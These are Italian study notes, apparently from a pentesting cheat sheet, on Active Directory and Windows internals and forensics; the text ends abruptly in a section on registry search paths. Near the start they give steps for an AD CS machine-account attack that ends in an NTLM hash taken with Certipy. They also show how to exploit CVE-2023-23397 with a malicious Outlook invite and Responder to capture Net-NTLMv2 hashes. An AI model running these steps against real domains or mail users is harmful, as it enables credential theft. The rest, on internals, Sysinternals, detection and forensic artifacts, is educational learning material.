__N.B: Molte volte accade che vi siano problemi di fuso orario con il domain controller e quindi dobbiamo sincronizzarci__

_Comandi per risolvere:_

```bash
sudo apt install systemd-timesyncd
timedatectl set-ntp true
sudo timedatectl set-ntp 0
sudo ntpdate -u <dominio target> && date #comandi per modificare il fuso orario
```

```bash
sudo ntpdate 0.debian.pool.ntp.org
sudo hwclock --systohc
sudo systemctl enable --now systemd-timesyncd
sudo timedatectl set-ntp true #comandi per ritornare al fuso orario corretto
```

_Comandi powershell per modificare le proprietà di un computer nell'AD:_ 
```bash
addcomputer.py '<dominio>/<username>:<password>' -method LDAPS -computer-name '<nome_da_scegliere>' -computer-pass '<password_da_scegliere>'
#aggiungere il computer al gruppo della machine di active directory 
```
```powershell
Get-ADComputer <nome computer> -properties dnshostname,serviceprincipalname
```
```powershell
Set-ADComputer <nome computer> -ServicePrincipalName @{}#importante rendere vuoto SPN perchè entra in conflitto con quello dell'active directory
```
```powershell
Set-ADComputer <nome dominio> -DnsHostName <nome completo del dominio> #comando per modificare l'hostname
```
_Rigenerare il certificato di template machine e tramite __Certipy auth__ prendere NTLM hash e il gioco è fatt0._

##### Certificati AD:

___"AD CS"__ (Active Directory Certificate Services) è il servizio che si occupa di gestire i certificati, è molto utile in quanto per tutti i computer, servizi all'interno dell'AD si occupa lui stesso di essere il loro __"CA"__ (Certificate Authority), ha anche il compito di creare dei __"Certificate template"__ i quali indicano chi utente e con quali determinati permessi può richiedere un certificato ed infine si occupa di criptare i file systems, creare e verificare le firme digitali.
I certificati hanno una peculiarità che li rende interessati che anche se ad un account compromesso viene cambiata la password loro non ne vengono intaccati, potendo cosi permettere la [persistence](./#varie)(al seguente link è spiegato un metodo di persistenza) nel sistema windows_

- __Funzionamento:__

1) l'user genera la coppia chiave pubblica e privata

2) l'user invia la certificate request alla CA

3) controllo del certificate template e dei permessi

4) esito positivo, generazione del certificato e firma con la chiave privata del CA

5) l'user lo registra nel sistema windows e lo utilizzerà quando ne avrà bisogno

### CVE-2023-23397 (Outlook):

_La seguente vulnerabilità impatta Outlook installato sul pc e non OWA (Outlook Web App) e Microsoft 365, la criticità è alta perchè tramite un email infetta permette di ricavare il Net-NTLMv2 hashes di un utente.
La vulnerabilità consiste nel creare un invito malevolo del calendario che ha tre parametri modificati da noi: i primi due sono __"PidLidReminderOverride"__ e __"PidLidReminderPlaySound"__ settati a true in modo che l'audio della nostra email abbia la precendenza e che l'audio venga avviato subito il terzo parametro è il __"PidLidReminderFileParameter"__ a questo parametro inseriamo un nostro __"UNC (Universal Naming Convention)"__ che punta ad uno nostro file online condiviso per esempio tramite SMB, questo farà scattare la NTLM autenticazione e il relativo stealing dell'hash_

_Comandi:_
```bash
responder -I <interfaccia di rete> #comando che avvia dalla nostra machine responder per la cattura dell'hash
```
```
home-> nuovo appuntamento-> icona calendario in basso a sinistra-> promemoria impostato a 0 minuti-> ora scarichiamo il plugin OutlookSpy che permette di sbloccare tutte le funzionalità di outlook-> outlookspy-> oggetto corrente-> ReminderOverrideDefault e ReminderPlaySound modificati a TRUE mentre ReminderSoundFile con UPN malevolo-> avvia-> inviare l'email #passi per eseguire la vulnerabilità
```

### Link a risorse esterne:

_Lascio qui alcuni link per delle risorse che possano servire:_

- _[Active Directory](https://github.com/AleHelp/Active-Directory), repo che passo passo spiega come creare una piccolo home lab con un domain controller e vari attacchi ad esso_

- [Writeups THM](https://github.com/AleHelp/Writeups-Tryhackme) repo contenente writeups sia di macchine linux che di macchine windows 

- [Writeups HTB](https://github.com/AleHelp/Writeups-Hackthebox) repo contenente writeups sia di macchine linux che di macchine windows

- [Writeups Disturbante](https://github.com/Disturbante/THM-Writeups) repo contenente writeups sia di macchine linux che di macchine windows

- [Writeups Disturbante](https://github.com/Disturbante/HTB-writeups) repo contenente writeups sia di macchine linux che di macchine windows 

# Windows:

### Processi di avvio

_Schema per semplificare la spiegazione dei processi:_

_system (Primo processo, colui che da il via a tutto)_

Sytem crea:

- _smss.exe (Session Manager Subsystem ,processo che crea nuove sessioni e variabili d'ambiente, si termina da solo)_

smss.exe crea:
          
- _win32k.sys (kernel mode, si occupa della GUI di windows)_
  
- _winsrv.dll (user mode, gestisce le attività legate alla creazione, gestione e interazione con il desktop di Windows)_
  
- _csrss.exe (user mode, responsabile della Win32 console, creazione e eliminazione di thread, rende disponibile le API ad altri processi)_

csrss.exe crea:

- _winlogon.exe (session 1, sessione utente si occupa del logon e logoff utenti e carica il profilo dell'utente dopo il logon)_

- _wininit.exe (session 0, una sessione isolata per il sistema operativo windows, si occupa dell'avvio)_

wininit.exe crea:

- _explorer.exe (si occuppa dell'accesso a file e cartelle per l'utente)_

- _lsass.exe (Local Security Authority) e lsaiso.exe(processo collegato con credential guard and keyguard, lo si vede solo se attivi)_

- _services.exe (Service control manager, si occupa di tutto quello che riguarda i servizi)_

services.exe crea:

- _svchost.exe (Host process, si occupa di ospitare e controllare un servizio, è completamente gestito da services.exe)_

_Approfondimenti per gli esegubili sopra elencati:_ 

_services.exe:_
gestisce un DB con i vari servizi ed è possibile interrogarlo con l'eseguibile __"sc.exe"__, inoltre troviamo altre informazioni nelle chiavi di registro __"HKLM\System\CurrentControlSet\Services"__ è anche responsabile al settaggio del __LastKnownGood__ (Una sorta di backup per windows).

_svchost.exe:_
I servizi runnati da questo processo sono implementati come DLL e sono immagazzinate nella subkey __Parameters__ a questo path __"KLM\SYSTEM\CurrentControlSet\Services\SERVICE NAME\Parameters"__, per vederli basta fare click desto su process hacker, notiamo il servizio che runna, se rifacciamo click destro su __"Proprietà"__, otterremo maggiori info, una cosa è importante che vi sia la flag -k che è il key identifier.

_Tools:_

Vari sono i tool per tenere d'occhio i processi, ne elenchiamo alcuni:

- [Process Hacker](https://processhacker.sourceforge.io/archive/website_v2/downloads.php)

- [Procmon della suite dei sysinternal](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)

- TaskManager integrato in windows
(__N.B è consigliato nella sezione __"Details"__ di aggiungere le colonne "Image Path Name" e "Command Line"
per vedere cosa un processo fa e il suo path__)

### API

_I programmi molte volte hanno bisogno di comunicare con la componente hardware o con il sistema stesso di windows è cosi che nascono le Win 32 Api, librerie che fanno da interfaccia tra la user-mode delle applicazione e il kernel._

__N.B: esistono tue tipi di accesso all'hardware: User-mode(no accesso diretto all'hardware, propria locazione di memoria) Kernel-mode(Accesso diretto ad hardware e memoria fisica).__

__Componenti delle API:__

- Header file: Definisce le librerie da importare durante il run-time, il programma a cui servono utilizzerà dei puntatori per reperirle.

- Core DLLs: gruppo di DLL che definisco la struttura di chiamate.

 ES: `(KERNEL32, USER32, ADVAPI32)` queste definiscono i servizi user e kernel. 

- DLLs supplementari: DLL che controllano parti del subsystem di windows OS, sono 36.

- Call Structures: Definisce la API stessa e i parametri da passargli.

ES:  
<!-->
      BOOL WriteProcessMemory(
      [in]  HANDLE  hProcess,
      [in]  LPVOID  lpBaseAddress,
      [in]  LPCVOID lpBuffer,
      [in]  SIZE_T  nSize,
      [out] SIZE_T  *lpNumberOfBytesWritten
      );
<!-->

- API Calls: chiamate della API utilizzate in un programma con gli indirizzi alle funzioni

- Input output parametri: il valore definito dalle call structures

_Ogni API call della libreria WIN32 risiede in RAM e ogni call richiede un puntatore a un indirizzo di memoria, perà il tutto è oscurato dall'ASLR(Address Space Layout Randomization) che comunque alla fine può essere bypassato con vari metodi tipo:_

- Header file (windows.h):

Quando questo header file è incluso nel nostro Unmanaged program(cioè il nostro programma, compilato e runnato) ogni funzione di win32 può essere chiamata durante il run-time, il loader capisce quale chiamate vengono utilizzate, creando una sorta di tabella con i vari indirizzi di memoria o puntatori di indirizzi per le funzioni.

- P/Invoke: Altro metodo, come primo passo importiamo la DLL che ci serve, poi definiamo un managed method (metodo controllato dall'OS) come esterno che potremo richiamare come vorremmo.

__Esempio codice di un'API:__

- Dichiarazione e riempito dei parametri di un'API call:
<!-->
    HWND hwnd = CreateWindowsEx(
       	0, 
       	CLASS_NAME, 
       	L"Hello World", 
       	WS_OVERLAPPEDWINDOW, 
       	CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, 
       	NULL, 
       	NULL, 
       	hInstance, 
       	NULL
       	);
<!-->

__Implementazione API in .NET e powershell:__
<!-->
    class Win32 {
     	[DllImport("kernel32")]
     	public static extern IntPtr GetComputerNameA(StringBuilder lpBuffer, ref uint lpnSize);
     }
     
    static void Main(string[] args) {
     	bool success;
     	StringBuilder name = new StringBuilder(260);
     	uint size = 260;
     	success = GetComputerNameA(name, ref size);
     	Console.WriteLine(name.ToString());
     }
<!-->
    $MethodDefinition = @"
        [DllImport("kernel32")] #importiamo la DLL
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); #importiamo la api call
        [DllImport("kernel32")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    "@; #in powershell vanno definite dentro ad un metodo,
<!-->
    $Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru; #va creato un nuvo tipo per i puntatori di win32DLL. inoltre verrà creato un file temporaneo che 
    compilerà queste DLL con csc.exe.
<!-->
    Win32.Kernel32]::<Imported Call>() #comando per utilizzarle
<!-->
### PE (Portable Executable):

_PE è una struttura dati che contiene le informazioni necessarie per i file, programmi e DLL, inoltre le componenti già citate avendo una struttura del PE uguale, possono lavorare sia su windows ad architettura x86 e x64; quando un programma o una DLL hanno la necessità di essere runnate, windows carica il programma in RAM e poi tramite la lettura del codice all'interno del PE, lo eseguirà_

- __Struttura PE:__

_Ogni header del PE è una struct, la struct permette di dichiarare molteplici variabili di diverso tipo in una singola entità cioè la struct_

__N.B: La struttura del PE viene spiegata partendo dall'alto verso il basso__

__DOS Header__ = prima parte in assoluta dell'header è composto da 64 bytes, riconoscibile questo header dai valori esadecimali __"4D 5A = MZ (Mark Zbikowski uno dei creatori del formato MS-DOS)"__ inoltre questa firma identifica il PE format quindi garantisce la compatibilità con il sistema operativo infine l'header ha diverse variabili di cui una è utile la __"e_lfanew"__ contiene l'indirizzo di dove inizia IMAGE_NT_HEADERS ed è utilizzato in una tecnica di injection la [Process Hollowing](./#tecniche-di-injection) 

__DOS Stub__ = seconda parte dopo il DOS Header anche esso garantisce che vi sia retrocompatibilità è la tipica scritta di quando si decompila un .exe e recita __"This program cannot be run in DOS mode"__, questa scritta comparirà solo se il PE non è compatibile

__IMAGE_NT header__ = questo header contiene informazioni vitali per il PE ed a sua volta contiene:

 - _NT HEADERS che contiene i campi:_

   1) Signature = la firma del PE infatti troviamo 4 bytes __"50 45 00 00 = PE"__

   2) File Header = il file header contiene informazioni importanti come: Machine l'architettura del PE file scritto, NumberOfSections il numero di sezioni nel 
      PE, TimeDateStamp data e ora di quando è stato compilato, PointerToSymbolTable e NumberOfSymbols puntatore e numero dei simboli (variabili, label e 
      funzioni), SizeOfOptionalHeader grandezza dell'header opzionale e Characteristics le caratteristiche del PE

   3) Optional Header = l'header opzionale inizia subito dopo la fine del File header, l'optional header contiene: Magic indica se il PE è a 32 o 64 bit, 
      AddressOfEntryPoint campo importante che contiene l'indirizzo dell'entry point dove inizia il codice, BaseOfCode e BaseOfData indirizzi delle sezioni data 
      e codice, ImageBase contiene l'indirizzo di base a cui verrà caricato il programma in memoria, Subsystem se è windows nativo GUI o CUI ed infine 
      DataDirectory contiene le informazioni di import e export nel PE

 - _IMAGE_SECTION_HEADER che anche lui contiene:_
   
   1) .text = contiene il codice dell'eseguibile

   2) .data = contiene le variabile iniziali definite, ha i permessi lettura/scrittura ma non esecuzione

   3) .rdata/.idata = contengono informazioni funzioni importate da altri file o da windows API
  
   4) .reloc = contiene informazioni di relocazione del PE

   5) .rsrc = contiene i collegamenti alle risorse esterne come: immagini, icone, manifest file ecc...

   6) .ndata = contiene i dati non inizializzati

   _Continuiamo sempre nella IMAGE_SECTION_HEADER con altri campi importanti:_

   1) VirtualAddress = indica l'indirizzo virtuale a cui verrà mappato nella memoria virtuale
  
   2) VirtualSize = indica la dimensione nella memoria virtuale
  
   3) SizeOfRawData = indica la dimensione su disco
  
   4) Characteristics = indica i permessi della sezione
  
 - _IMAGE_IMPORT_DESCRIPTOR ci da una visione di quale API il PE ha caricato quando viene eseguito_

- __Tools:__

_Esistono dei tools per vedere e controllare la struttura dei PE:_

- [PE Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) della suite sysinternals

- [PE-Tree](https://github.com/blackberry/pe_tree)

- [PEcheck](https://github.com/DidierStevens/DidierStevensSuite/blob/master/pecheck.py) per il controllo del PE esempio entropia delle sezioni

### Register Keys

_il Registro di sistema (o Registro Windows) è un database gerarchico che contiene le impostazioni, le configurazioni e altre informazioni cruciali per il corretto funzionamento del sistema operativo e delle applicazioni installate è organizzato in key e subkeys le quali sono:_

 - HKEY_CLASSES_ROOT (HKCR):
   _Questa chiave contiene le associazioni tra estensioni di file e programmi, e definisce come le applicazioni si comportano quando si lavora con tipi di file specifici e in realtà e un 
   insieme delle chiavi HCKU e HKLM_

 - HKEY_CURRENT_USER (HKCU):
   _Questa chiave contiene le impostazioni specifiche dell'utente che sta effettuando l'accesso al sistema. Ad esempio, impostazioni personalizzate, preferenze, stampanti e altro ancora._

 - HKEY_LOCAL_MACHINE (HKLM):
   _Questa chiave contiene le impostazioni relative al computer locale. Qui sono presenti informazioni sul software installato, hardware, configurazioni di sistema e altro ancora._

 - HKEY_USERS (HKU):
   _Questa chiave contiene i profili degli utenti attualmente registrati sul computer. Ogni utente avrà un sottoalbero in questa chiave, simile alla struttura di HKCU._

 - HKEY_CURRENT_CONFIG (HKCC):
   _Questa chiave contiene informazioni sulla configurazione hardware attuale del computer. Viene creato dinamicamente durante l'avvio del sistema._

__Sono importanti da conoscere perchè da lato attaccante possono causare bei danni, dal lato difesa possono essere fonti di informazioni per capire eventuali attacchi ricevuti.__

### UAC

_UAC (User Access Control) utilizzato per non fare eseguire codice o script malevoli, in quanto richiede i priviliegi di amministratore, è anche all'interno delle MIC(Mandatory Integrity Control) un meccanismo che assegna a utenti, gruppi e processi un IL(Integrity Level) più è alto il livello e più puoi fare cose nel sistema_

_per comprendere appieno l'UAC prima bisogna capire cosa è IL(Integrity Level) e la sua divisione in 4 livelli:_

- Low = utilizzo solo dell'explorer dei file
- Medium = per utenti normali e amministratori con il filtered token
- High = amministratori con elevated token
- System = livello utilizzato dal utente system

_Ogni IL è poi assegnato ad un UAC token che può essere di diversi tipi:_

 Non-administrators = singolo token utilizzato dagli utenti a IL medium

 Administrators hanno 2 token a loro volta:
   
   - Filtered Token= token per amministratori con meno priviliegi ha IL medium
   - Elevated Token= token con i pieni priviliegi IL hard

_Ora possiamo passare al suo funzionamento parlando in maniera dettagliata dei vari passaggi che la contraddistinguono:_

1) l'utente richiede di runnare un'applicazione come amministratore
2) viene fatta la chiamata alle API ShellExecute che impostando il runas verb apre una shell per elevare i privilegi e in questo modo attivare il meccanismo di
   UAC
3) la richiesta viene girata al service AppInfo.exe che a sua volta andrà a controllare l'application manifest per checkare una possibile autoelevation
4) verrà poi runnato consent.exe che permette di elevare i privilegi, consent.exe verrà runnato in un secure desktop, un desktop che isola i processi per evitare la compromissione dell'UAC
5) l'esito se positivo farà in modo che il nuovo processo creato punti alla shell creata in precendenza per elevare i privilegi.

_Sopra se notiamo bene viene menzionata l'autoelevation, bene è una peculiarità sempre correlata alla user access control e riguarda gli eseguibili i quali possono essere avviati senza il controllo da parte dell'UAC però devono soddisfare dei requisiti:_

- Firmati da Windows Publisher (infatti quasi tutte le funzionalità del pannello di controllo e alcuni eseguibili rientrano nell'autoelevetion)
- essere all'interno di directory fidate come C:\WINDOWS\System32 o C:\Program files

_Ulteriori info per l'autoelevation:_

-.exe devono aver segnato l'autoElevate nel proprio manifest __tool per il controllo del manifest è [sigcheck](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)__
```cmd
C:\path di sigcheck.exe -m <Path eseguibile da vedere> #comando per leggere il manifest
```
- .mmc.exe(microsoft management console) a seconda poi degli .msc snap richiesti ma in genere ha l'autoelevation

__N.B: la UAC può essere modificate nella voce __"UAC settings".____

### AMSI

L'AMSI (Anti-Malware Scan Interface) è un runtime detection integrato con powershell che scannerizza il codice prima che venga runnato e determina se malevolo o meno, viene avviato da defender e evita che lo script malevolo venga runnato nel .NET runtime ed è completamente integrato con:

- _User Account Control, or UAC_
  
- _PowerShell_
  
- _Windows Script Host (wscript and cscript)_
  
- _JavaScript and VBScript_
  
- _Office VBA macros_

_L'AMSI è orchestrato dalla __"System.Management.Automation.dll"__ (.NET assembly sviluppato da Windows) e anche dalla __"amsi.dll"__, a seconda del tipo di script o applicazione, vi sono diverse DLL che analizzano il codice tipo:_

- Powershell, VBScript = Win32 API-> AMSI.h, AMSI.lib, AMSI.dll-> AmsiScanBuffer() o AMSIScanString()

- altre applicazioni = COM API-> Amsi.h, Amsi.dll-> lAntimalware::Scan()

- Antivirus = lAntimalwareProvider::Scan()

_Windows defender invece sfrutta le DLL MPEngine.dll e MPSvc.dll_

_L'AMSI si attiva quando lo script è caricato in RAM e poi eseguito dal __"CLR (Common Language Runtime)"__ se invece lo script è nella memoria di massa non si attiva_

### Suite SysInternals:

_La suite dei sysinternale è una suite ufficiale windows con all'suo interno diversi eseguibili che possono essere utili per approfondire di come stia lavorando il pc cioè: analisi dei processi, analisi del disco rigido, controllo degli autorun, controllo connessione di tipo TCP/UDP e ecc...
Possiamo reperire la suite scaricandola dal seguente [link](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) o utilizzarli in live dal seguente [link](https://live.sysinternals.com/)._

__Installazione suite:__

_Una volta installata il .zip dal sito linkato sopra, dovremo andare a modificare la variabile d'ambiente del sistema __"PATH"__ in modo che la suite possa essere avviata senza dover ogni volta andare nella cartella contenente i vari tools._

_Comandi:_
```cmd
sysdm.cpl #comando per aprire un'estensione del pannello di controllo che permette di modificare le variabili d'ambiente
```
```
Avanzate-> Variabili d'ambiente-> Path(Varibili di sistema)-> modifica-> nuovo-> aggiungimamo il path alla cartella contenente la suite-> ok su tutto #passi dettagliati sulle varie voci da seguire per la corretta configurazione
```
```cmd
diskmon #comando prova per aprire da cmd diskmon
```

__Utilizzo tramite web:__

_Abbiamo la possibilità di utilizzare i sysinternals anche tramite web ma per farlo va installato un client webDAV che permette la connessione da remoto ad una macchina e altre configurazioni da apportare alla nostra macchina._

_Comandi:_
```powershell
Start-Service WebClient #comando powershell per avviare il client webDAV
```
```cmd
control.exe /name Microsoft.NetworkAndSharingCenter #comando per aprire il pannello per le connessioni di rete
```
```
Modifica Impostazioni di condivisione avanzate-> attivare individuazioni di rete pubbliche #attivazione della seguente feature
```
```powershell
\\live.sysinternals.com\tools\<nome eseguibile> #comando in powershell per aprire l'eseguibile da remoto
```      

##### File e Dischi:

_Utilizzo di eseguibili per l'ispezione e la modifica di file e dischi_

1) SigCheck:

_Command line per la verifica di firme inerenti ad un file_

_Comandi:_
```powershell
sigcheck -u -e C:\Windows\System32 -accepteula #comando per il controllo di file non firmati
```
2) Streams:

_Eseguibile da command line che permette di vedere il contenuto degli ADS, esistono però dei comandi in powershell che permettono di visionarli, basta solo cliccare [qui](./#comandi-ads-alternate-data-stream)_

_Comandi:_ 
```powershell
streams <path del file> -accepteula #comando per vedere il contenuto degli ADS
```
3) SDelete:

_Tool per cancellare in maniera sicura un file_

_Comandi:_
```powershell
sdelete <path del file> -p <num volte da cancellare> #comando per eliminare in maniera sicura
```

_[Link](https://docs.microsoft.com/en-us/sysinternals/downloads/file-and-disk-utilities) per la lista completa degli eseguibili e di cosa fanno_

##### Rete:

_Tool per il monitoraggio della rete_

1) TCPView:

_Eseguibile che se avviato da un'ottima visiona dei socket in ascolto o delle connessioni stabilite, molto potente se utilizzato con wireshark_

_[Link](https://docs.microsoft.com/en-us/sysinternals/downloads/networking-utilities) per la lista completa degli eseguibili e di cosa fanno_

##### Processi:

_Eseguibili che permettono il monitoraggio dei processi_

1) Autoruns:

_Utility per vedere quali programmi sono configurati per avviarsi quando si fa il login o al momento dell boot del pc_

2) ProcDump:

_Tool che permette di fare il dump dei processi per poi analizzare cosa è successo, è possibile fare un fulldump o un minidump._

3) ProcessMonitor:

_Utility che permette di controllare i processi, che operazioni stanno facendo e cosa hanno modificato e il tutto è eseguito tramite dei filtri._

4) PSExec:

_Command line tool che permette di eseguire comandi da remoto, utilizzato per il [lateral movements](./#lateral-movements)._

5) PsService:

_Utility che permette di ricavare informazioni inerenti ai servizi_

_[Link](https://docs.microsoft.com/en-us/sysinternals/downloads/process-utilities) per la lista completa degli eseguibili e di cosa fanno_

##### Sicurezza:

_Eseguibili o command line che danno una visione di insieme sulla sicurezza del computer_

1) Sysmon:

_Agent per il monitoring degli endpoint che poi può essere integrato in un SIEM_

_Comandi:_
```powershell
Sysmon.exe -accepteula -i <configurazione xml> #comando per avviare sysmon con una configurazione xml importata
```
```
Visualizzatore di eventi-> Registri applicazione e servizi-> Microsoft-> Windows-> Sysmon-> Operational #passi per vedere gli eventi registrati
```
_Best Practices:_ 

1) escludere meglio di includere, perchè cosi si è si sicuri di non dimenticarsi qualche evento

2) Utilizzo della CLI quali Get-WinEvent o wevtutil.exe

- __Rilevamento:__

_Piccola sezione dove viene appuntato come rilevare i tool più noti di pentesting_

- _Metasploit:_

_Una buona pratica per cercare l'utilizzo di metasploit è nelle connessioni aperte come la porta 4444 o 5555 per poi fare un'ulteriore ricerca su ProcessID e Image_

- _Mimikatz:_

_Il primo passo per rilevare la presenza di Mimikatz può essere nella ricerca di file creati dallo stesso software o che hanno il suo stesso nome, il secondo passo é nel controllo del LSASS, verificare da quali altri processi viene utilizzato e se vi è una numerosa presenza di svchost.exe può essere un campanello di allarme_

_[Link](https://docs.microsoft.com/en-us/sysinternals/downloads/security-utilities) per la lista completa degli eseguibili e di cosa fanno_

##### Informazioni di sistema:
_Tool per visionare informazioni di sistema_

1) winObj:

_Eseguibile utilizzato per vedere le informazioni degli oggetti NT_

_[Link](https://docs.microsoft.com/en-us/sysinternals/downloads/system-information) per la lista completa degli eseguibili e di cosa fanno_

##### Generali:

_Utilities per info generali sul sistema_

1) BgInfo:

_Utilizzato per scrivere le info generali sul pc avviato_

2) RegJump:

_Piccola utility che apre regedit e va direttamente al valore che si cerca_

_Comandi:_
```powershell
regjump <path valore> -accepteula #comando per andare subito ad un valore  
```
_[Link](https://docs.microsoft.com/en-us/sysinternals/downloads/system-information) per la lista completa degli eseguibili e di cosa fanno_

### Forense: 

_Sezione dedicata alla Forense in windows, sapere dove cercare è allo stesso tempo saper imparare per coprire le proprie tracce_

##### FAT e NTFS:

_Nel mondo della Forense è importante avere una visione d'insieme su dove noi andiamo a recuperare i dati, quindi conoscere i vari tipi di filesystems utilizzati da windows è importante e poi anche avere una sorta d'infarinatura generale non fa male_

- _FAT:_

_FAT (File Allocation Table) è una table ma più precisamente un lista collegata di __"cluster"__(L'unità di storage nel FAT), questa lista contiene lo stato dei cluster cioè se sono liberi o meno e inoltre i puntatori al prossimo cluster ed infine la grandezza totale del FAT è dato dal numero di bit utilizzati per indirizzare un cluster nella tabella_

_Esistono 4 tipi di FAT:_

1) FAT12 = 12 bit per cluster-> 2^12 = 4096 cluster indirizzabili-> 512B a 8KB di storage per cluster-> volume massimo supportato 32MB

2) FAT16 = 16 bit per cluster-> 2^16 = 65536 cluster indirizzabili-> 2KB a 32KB di storage per cluster-> volume massimo supportato 2GB

3) FAT32 = 28 bit per cluster-> 2^28 = 268,435,456 cluster indirizzabili-> 4KB a 32KB di storage per cluster-> volume massimo supportato 2TB

4) exFAT = 64 bit per cluster-> 2^64 = 18,446,744,073,709,551,616 cluster indirizzabili-> 32MB di storage per cluster-> volume massimo supportato 128P
   _Questo tipo di filesystem è utilizzato nelle memorie flash come schede SD_

- _NTFS:_

_NTFS (New Technology Filesystem) è il più recente filesystem sviluppato da microsoft e muta di molto rispetto al FAT, in primis già cambia per le dimensioni di storage supportate che sono molto di più, poi abbiamo il __"Journaling"__, cioè un log ($LOGFILE) che tiene traccia di tutte le modifiche ai metadati, abbiamo i controlli all'accesso i quali definiscono il proprietario di un file e i permessi dei vari utenti a quel file, abbiamo poi la possibilità dei backup con le shadow copies, l'[ADS](./#comandi-ads-alternate-data-stream), compressione e cifratura._

_NTFS piuttosto che avere la File Allocation Table dispone della __"Master File Table"__, una table più complessa rispetto al FAT è un database strutturato che tiene traccia degli oggetti immagazzinati, la __"MFT"__ possiede dei file importanti da un punto di vista forense e sono:_

1) $MFT = MFT è il primo record nel filesystem, contiene poi il VBR (Volume Boot Record) che punta al cluster del MFT infine MFT ha le informazioni sui cluster e quali oggetti contengono

2) $LOGFILE = file di log che registra le varie modifiche nel NTFS

3) $UsnJrnl = è anche chiamato change journal perchè tiene conto di tutte le modifiche apportate ai file e il motivo  si trova nel $Extent record

_Grazie al tool [MFT Explorer](https://ericzimmerman.github.io/#!index.md), andremo a visionare gli MFT files_

_Comandi:_
```powershell
MFTECmd.exe -f <path di $MFT> --csv <path per salvare il csv> #comando di MFTECmd per analizzare il file $MFT
```
##### Registri:

_La spiegazione di cosa sono e di quali sono i registri si trova [qui](./#register-keys)_

_Durante un'acquisizione forense, saremmo in possesso di una copia dell'immagine d'analizzare offline è quindi bene sapere dove e quali registri visionare.
La maggior parte dei registri sono collocati in __"C:\Windows\System32\Config"__ e sono:_

- DEFAULT (HKEY__USERS\DEFAULT)

- SAM (HKEY_LOCAL_MACHINE\SAM)

- SECURITY (HKEY_LOCAL_MACHINE\SECURITY)

- SOFTWARE (HKEY_LOCAL_MACHINE\SOFTWARE)

- SYSTEM (HKEY_LOCAL_MACHINE\SYSTEM)

_Vi sono poi ulteriori registri che contengono i dati e le informazioni dell'utente i quali sono:_

- NTUSER.DAT (HKEY_CURRENT_USER) e si trova alla directory (__"C:\Users\<nome user>\"__)

- USRCLASS.DAT (HKEY_CURRENT_USER\Software\CLASSES) e si trova alla directory (__"C:\Users\<nome user>\AppData\Local\Microsoft\Windows"__)

- __File cache, log e backups:__

_Altri file importanti sono quelli di cache, log e backups che generalmente possiamo trovare in:_

- Cache = C:\Windows\AppCompat\Programs\Amcache.hve file che salva dati sui programmati avviati

- Log = C:\Windows\System32\Config cartella dove possiamo trovare i file log dei registri principali salvati con l'estensione .LOG

- Backup = C:\Windows\System32\Config\RegBack cartella con i backup dei registri

- __Informazioni di sistema e account:__

- _Versione OS:_

_La versione dell'OS che stiamo analizzando è possibile verificarla alla path __"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion"___

- _Current Control Set:_

_Il current control set è un registro che contiene i dati per la configurazione (Driver,servizi,hardware...) della macchina windows, ne esistono 3 e sono situati in __"HKLM\SYSTEM"__: quando vi è il boot della macchina, windows crea un control set volatile chiamato __"HKLM\SYSTEM\CurrentControlSet"__,è infine possibile vedere la configurazione scelta alle path __"SYSTEM\Select\Current"__ e __"SYSTEM\Select\LastKnownGood"___

- _Nome computer:_

_Il nome del computer è possibile trovarlo nel registro __"HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName"___

- _Fuso orario:_

_Nell'indagine Forense è bene capire qual'è il fuso orario è possiamo scoprirlo alla path __"HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation"___

- _Interfacce di rete:_

_Possiamo scoprire a quella interfaccia di rete si è connessi a questa path __"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces"__ invece per le connessioni di rete passate si può andare qui __"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures\Unmanaged"__ e __"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures\Managed"__ ogni rete sarà contrassegnata da un identificatore univoco __"GUID"___

- _Spegnimento del PC:_

_Alla seguente path __"HKLM\SYSTEM\CurrentControlSet\Control\Windows"__, possiamo verificare quando il pc è stato spento_

__N.B: Ogni versione di windows modifica la posizione di questo registro__

##### File:

- _File recenti:_

_La path dove poter visionare i file aperti in ordine di ultima modifica è __"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs"__ e se vogliamo filtrare per estensione .txt basta aggiungere dopo __"\RecentDocs\.txt"__._

Possiamo fare un ulteriore indagine per i file office dove possiamo andare a vederli qui:_

1) HKCU\Software\Microsoft\Office\VERSION

2) HCKU\Software\Microsoft\Office\<num versione>\Word

[link](https://docs.microsoft.com/en-us/deployoffice/install-different-office-visio-and-project-versions-on-the-same-computer#office-releases-and-their-version-number) alle versioni di office

3) HCKU\Software\Microsoft\Office\VERSION\UserMRU\LiveID_####\FileMRU

_Un'altro modo per determinare il tipo di file aperto è tramite l lo __"ShellBag"__, cioè le impostazioni di preferenza del layout delle finestre che possono essere trovate alle seguenti path:_

1) HCKU\Software\CLASSES\Local Settings\Software\Microsoft\Windows\Shell\Bags

2) HCKU\Software\CLASSES\Local Settings\Software\Microsoft\Windows\Shell\BagMRU

3) HCKU\Software\Microsoft\Windows\Shell\BagMRU

4) HCKU\Software\Microsoft\Windows\Shell\Bags

__N.B: il tool [ShellBag explorer](https://ericzimmerman.github.io/#!index.md) può semplificarci la vita__

- _Box dialogo:_

_Alla seguenti path __"HCKU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePIDlMRU"__ e __"HCKU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU"__ è possibile risalire a quale ultimo dialogo di box è stato utilizzato e quindi a quale file o applicazione l'ha chiamato_

- _Ricerche path:_

